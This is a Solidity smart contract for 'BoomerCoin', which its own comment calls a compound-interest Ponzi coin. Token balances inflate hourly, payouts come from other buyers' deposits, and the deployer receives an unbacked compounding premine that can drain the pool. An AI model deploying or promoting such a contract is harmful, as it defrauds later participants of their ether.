1 pragma solidity ^0.4.18;
2 
3 //compound interest based ponzi coin
4 
5 contract BoomerCoin
6 {
7     string constant public name = "BoomerCoin";
8     string constant public symbol = "SSN";
9     uint8 constant public decimals = 5;
10     
11     mapping(address => uint) public initialBalance;
12     mapping(address => uint) public boughtTime;
13     
14     uint constant public buyPrice = 12 szabo; //20% higher than the sell price, it takes 6.4 hours to break even
15     uint constant public sellPrice = 10 szabo;
16 
17     uint constant public Q = 35; //interest rate of 2.85%, ((1/2.85)*100, see fracExp)
18 
19     function BoomerCoin() public {
20         //0.83 ether premine for myself
21         initialBalance[msg.sender] = 1 ether / buyPrice;
22         boughtTime[msg.sender] = now;
23     }
24 
25     //calc geometric growth
26     //taken from https://ethereum.stackexchange.com/questions/35819/how-do-you-calculate-compound-interest-in-solidity/38078#38078
27     function fracExp(uint k, uint q, uint n, uint p) internal pure returns (uint) {
28         uint s = 0;
29         uint N = 1;
30         uint B = 1;
31         for (uint i = 0; i < p; ++i){
32             s += k * N / B / (q**i);
33             N  = N * (n-i);
34             B  = B * (i+1);
35         }
36         return s;
37     }
38 
39     //grant tokens according to the buy price
40     function fund() payable public returns (uint) {
41         require(msg.value > 0.000001 ether);
42         require(msg.value < 200 ether);
43 
44         uint tokens = div(msg.value, buyPrice);
45         initialBalance[msg.sender] = add(balanceOf(msg.sender), tokens);
46 
47         //reset compounding time
48         boughtTime[msg.sender] = now;
49 
50         return tokens;
51     }
52 
53     function balanceOf(address addr) public constant returns (uint) {
54 
55         uint elapsedHours;
56 
57         if (boughtTime[addr] == 0) {
58             elapsedHours = 0;
59         }
60         else {
61             elapsedHours = sub(now, boughtTime[addr]) / 60 / 60;
62 
63             //technically impossible, but still. defensive code
64             if (elapsedHours < 0) {
65                 elapsedHours = 0;
66             }
67             else if (elapsedHours > 1000) {
68                 //set cap of 1000 hours (41 days), inflation is beyond runaway at that point with this interest rate
69                 elapsedHours = 1000;
70             }
71         }
72 
73         uint amount = fracExp(initialBalance[addr], Q, elapsedHours, 8);
74 
75          //this should never happen, but make sure balance never goes negative
76         if (amount < 0) amount = 0;
77 
78         return amount;
79     }
80     
81     function epoch() public constant returns (uint) {
82         return now;
83     }
84 
85     //sell tokens back to the contract for wei
86     function sell(uint tokens) public {
87 
88         uint tokensAvailable = balanceOf(msg.sender);
89 
90         require(tokens > 0);
91         require(this.balance > 0); //make sure the contract is solvent
92         require(tokensAvailable > 0);
93         require(tokens <= tokensAvailable);
94 
95         uint weiRequested = mul(tokens, sellPrice);
96 
97         if (weiRequested > this.balance) {          //if this sell will make the contract insolvent
98 
99             //we still have leftover tokens even if the contract is insolvent
100             uint insolventWei = sub(weiRequested, this.balance);
101             uint remainingTokens = div(insolventWei, sellPrice);
102 
103             //update user's token balance
104             initialBalance[msg.sender] = remainingTokens;
105 
106             //reset compound interest time
107             boughtTime[msg.sender] = now;
108 
109             msg.sender.transfer(this.balance);      //send the entire balance
110         }
111         else {
112             //reset compound interest time
113             boughtTime[msg.sender] = now;
114 
115             //update user's token balance
116             initialBalance[msg.sender] = sub(tokensAvailable, tokens);
117             msg.sender.transfer(weiRequested);
118         }
119     }
120 
121     //sell entire token balance
122     function getMeOutOfHere() public {
123         uint amount = balanceOf(msg.sender);
124         sell(amount);
125     }
126 
127     //in case anyone sends money directly to the contract
128     function() payable public {
129         fund();
130     }
131 
132     //functions pulled from the SafeMath library to avoid overflows
133 
134     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
135         if (a == 0) {
136             return 0;
137         }
138         uint256 c = a * b;
139         assert(c / a == b);
140         return c;
141     }
142 
143     function div(uint256 a, uint256 b) internal pure returns (uint256) {
144         // assert(b > 0); // Solidity automatically throws when dividing by 0
145         uint256 c = a / b;
146         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
147         return c;
148     }
149 
150     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
151         assert(b <= a);
152         return a - b;
153     }
154 
155     function add(uint256 a, uint256 b) internal pure returns (uint256) {
156         uint256 c = a + b;
157         assert(c >= a);
158         return c;
159     }
160 }